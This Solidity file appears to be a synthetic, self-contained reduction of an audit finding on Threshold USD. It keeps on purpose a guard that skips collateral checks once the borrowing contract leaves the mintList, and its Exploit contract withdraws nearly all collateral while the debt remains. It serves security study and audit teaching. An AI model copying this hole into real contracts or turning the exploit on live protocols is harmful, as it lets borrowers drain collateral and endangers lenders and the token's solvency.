// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Threshold USD — _requireValidAdjustmentInCurrentMode bypass when not in mintList
    (Alex The Entreprenerd / Cantina Jun 2023, finding #54691)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: when BorrowerOperations is removed from thUSD.mintList, the
    adjustment invariant helper early-returns and skips collateralization checks.
    Depositors can withdraw nearly all collateral without repaying debt, leaving
    undercollateralized troves that threaten the THUSD peg / system solvency.

    Vulnerable early-return preserved with @> VULN.
    FIX: keep the same ICR checks for deprecated (non-mintList) systems. */

contract MockCollateral {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract THUSDToken {
    mapping(address => bool) public mintList;
    mapping(address => uint256) public balanceOf;

    function setMintList(address who, bool allowed) external {
        mintList[who] = allowed;
    }

    function mint(address to, uint256 amt) external {
        require(mintList[msg.sender], "not minter");
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal trove storage.
contract TroveManager {
    struct Trove {
        uint256 coll;
        uint256 debt;
    }

    mapping(address => Trove) public troves;

    function setTrove(address user, uint256 coll, uint256 debt) external {
        troves[user] = Trove(coll, debt);
    }

    function getTroveColl(address user) external view returns (uint256) {
        return troves[user].coll;
    }

    function getTroveDebt(address user) external view returns (uint256) {
        return troves[user].debt;
    }

    function decreaseColl(address user, uint256 amt) external {
        troves[user].coll -= amt;
    }
}

/// @notice Reduced BorrowerOperations — withdrawColl path + vulnerable guard.
contract BorrowerOperations {
    THUSDToken public thusdToken;
    TroveManager public troveManager;
    MockCollateral public collToken;

    // Liquity-style NICR precision (1e20)
    uint256 public constant NICR_PRECISION = 1e20;
    // Minimum ICR 110% in normal mode (1.1e18)
    uint256 public constant MCR = 11e17;

    struct LocalVariables_adjustTrove {
        uint256 coll;
        uint256 debt;
        uint256 newColl;
        uint256 newDebt;
        uint256 newICR;
    }

    constructor(THUSDToken _thusd, TroveManager _tm, MockCollateral _coll) {
        thusdToken = _thusd;
        troveManager = _tm;
        collToken = _coll;
    }

    /// @dev Open a trove with coll + debt (simplified; no fees).
    ///      Collateral is pre-funded on this contract (constructor) so the
    ///      profit chip can measure Alice's pure withdraw delta from 0.
    function openTrove(uint256 collAmt, uint256 debtAmt) external {
        require(collToken.balanceOf(address(this)) >= collAmt, "bo underfunded");
        troveManager.setTrove(msg.sender, collAmt, debtAmt);
        thusdToken.mint(msg.sender, debtAmt);
    }

    function withdrawColl(uint256 collWithdrawal) external {
        LocalVariables_adjustTrove memory vars;
        vars.coll = troveManager.getTroveColl(msg.sender);
        vars.debt = troveManager.getTroveDebt(msg.sender);
        require(vars.debt > 0, "no trove");
        require(collWithdrawal < vars.coll, "withdraw all coll");

        vars.newColl = vars.coll - collWithdrawal;
        vars.newDebt = vars.debt;
        vars.newICR = _computeICR(vars.newColl, vars.newDebt);

        // Price = 1e18 (1:1 coll:USD) for the synthetic.
        bool isRecoveryMode = false;
        _requireValidAdjustmentInCurrentMode(isRecoveryMode, collWithdrawal, false, vars);

        troveManager.decreaseColl(msg.sender, collWithdrawal);
        collToken.transfer(msg.sender, collWithdrawal);
    }

    function _computeICR(uint256 coll, uint256 debt) internal pure returns (uint256) {
        if (debt == 0) return type(uint256).max;
        // ICR = coll * 1e18 / debt  (price=1)
        return (coll * 1e18) / debt;
    }

    function _requireValidAdjustmentInCurrentMode(
        bool _isRecoveryMode,
        uint256 _collWithdrawal,
        bool _isDebtIncrease,
        LocalVariables_adjustTrove memory _vars
    ) internal view {
        /*
         * If contract has been removed from the thUSD mintlist remove the adjustment restrictions
         * // TODO: Can we just run away once deprecated?
         */
        // FIX: do not return early — enforce the same collateralization invariants
        if (!thusdToken.mintList(address(this))) { // @> VULN: early return skips ICR checks when not on mintList
            return;
        }

        // --- normal-mode checks (skipped when not on mintList) ---
        if (_isRecoveryMode) {
            require(!_isDebtIncrease, "no debt increase in recovery");
            require(_collWithdrawal == 0, "no coll withdraw in recovery");
        } else {
            // Require new ICR >= MCR
            require(_vars.newICR >= MCR, "ICR < MCR");
            // Also require NICR > 0
            require(_vars.newColl * NICR_PRECISION / _vars.newDebt > 0, "NICR == 0");
        }
        // silence unused when checks path taken
        _isRecoveryMode;
        _collWithdrawal;
        _isDebtIncrease;
    }
}

contract Alice {
    function open(BorrowerOperations bo, uint256 coll, uint256 debt) external {
        bo.openTrove(coll, debt);
    }

    function withdraw(BorrowerOperations bo, uint256 amt) external {
        bo.withdrawColl(amt);
    }
}

contract Exploit {
    MockCollateral public coll; // 1
    THUSDToken public thusd; // 2
    TroveManager public tm; // 3
    BorrowerOperations public bo; // 4 — vulnerable
    Alice public alice; // 5

    // Alice: 300% ICR with 300 coll / 100 debt  (price=1)
    uint256 public constant ALICE_COLL = 300 ether;
    uint256 public constant ALICE_DEBT = 100 ether;

    constructor() {
        coll = new MockCollateral();
        thusd = new THUSDToken();
        tm = new TroveManager();
        bo = new BorrowerOperations(thusd, tm, coll);
        alice = new Alice();

        thusd.setMintList(address(bo), true);
        // Pre-fund BO with Alice's collateral so openTrove does not pull from Alice
        // (Alice starts run() at 0 COLL; withdraw is pure profit).
        coll.mint(address(bo), ALICE_COLL);
    }

    function run() external {
        // 1) Alice opens healthy 300% ICR trove.
        alice.open(bo, ALICE_COLL, ALICE_DEBT);
        require(tm.getTroveColl(address(alice)) == ALICE_COLL, "coll");
        require(tm.getTroveDebt(address(alice)) == ALICE_DEBT, "debt");

        // 2) Deprecate: remove BorrowerOperations from mintList.
        thusd.setMintList(address(bo), false);
        require(!thusd.mintList(address(bo)), "still minter");

        // 3) Withdraw almost all coll without repaying — NICR dust left.
        // whatWeWantToWithdraw = coll - (debt / NICR_PRECISION)
        // debt/NICR_PRECISION = 100e18 / 1e20 = 1 (floor) in integer? 100e18/1e20 = 1e0 = 1 wei if exact...
        // 100 ether / 1e20 = 100e18 / 1e20 = 1e0 = 1
        uint256 dustKeep = ALICE_DEBT / 1e20; // = 1
        if (dustKeep == 0) dustKeep = 1;
        uint256 withdrawAmt = ALICE_COLL - dustKeep;

        uint256 aliceCollBefore = coll.balanceOf(address(alice));
        alice.withdraw(bo, withdrawAmt);

        // 4) HARM: trove massively undercollateralized (ICR ~ 0), alice got coll back.
        uint256 leftColl = tm.getTroveColl(address(alice));
        uint256 leftDebt = tm.getTroveDebt(address(alice));
        require(leftDebt == ALICE_DEBT, "debt must remain");
        require(leftColl < ALICE_DEBT, "still overcollateralized"); // coll << debt
        require(coll.balanceOf(address(alice)) == aliceCollBefore + withdrawAmt, "alice coll");

        // ICR = leftColl * 1e18 / debt << 100%
        uint256 icr = (leftColl * 1e18) / leftDebt;
        require(icr < 1e16, "ICR not crushed"); // < 1%
    }
}
